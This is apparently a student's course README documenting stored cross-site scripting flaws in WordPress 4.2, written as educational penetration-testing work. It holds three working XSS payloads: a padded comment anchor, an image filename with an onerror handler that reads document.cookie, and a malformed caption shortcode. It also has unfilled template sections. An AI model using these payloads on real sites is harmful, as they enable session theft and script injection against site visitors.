# Project 7 - WordPress Pentesting

Time spent: **12** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Unauthenticated Stored Cross-Site Scripting
  - [ ] Summary: If you comment a really long(>64kb) script, and after admin approves the comment, it will execute it and proudce a pop-up alert saying "hello world". 
    - Vulnerability types:XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1 
  - [ ] GIF Walkthrough:  https://media.giphy.com/media/A7WZ49vsevkS4qIczK/giphy.gif
  - [ ] Steps to recreate: After posting 
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[big enough to be 64 kb]..AAA'></a> as a comment or reply, and the admin user approving the comment, it will execute the script giving us the alert. 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

1. (Required) Authenticated Stored Cross-Site Scripting via Image FIlename
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.10
  - [ ] GIF Walkthrough:  https://media.giphy.com/media/2A67QSKKPKJ9otGgQ4/giphy.gif
  - [ ] Steps to recreate: If an image with a name of "cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg" is uploaded, then the script is excuted showing us an alert on the public page.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)

1. (Required) Authenticated Shortcode Tags Cross-Site Scripting
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.5
  - [ ] GIF Walkthrough:  https://media.giphy.com/media/ir8XQSag9m1NUKMZgC/giphy.gif
  - [ ] Steps to recreate: After posting "<p>TEST!!!<figure style="width: 1px;" class="wp-caption alignnone"><figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href="http://onMouseOver='alert(1)'">Click me</a></p>" in Pages or Posts, it produces an XSS alert 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
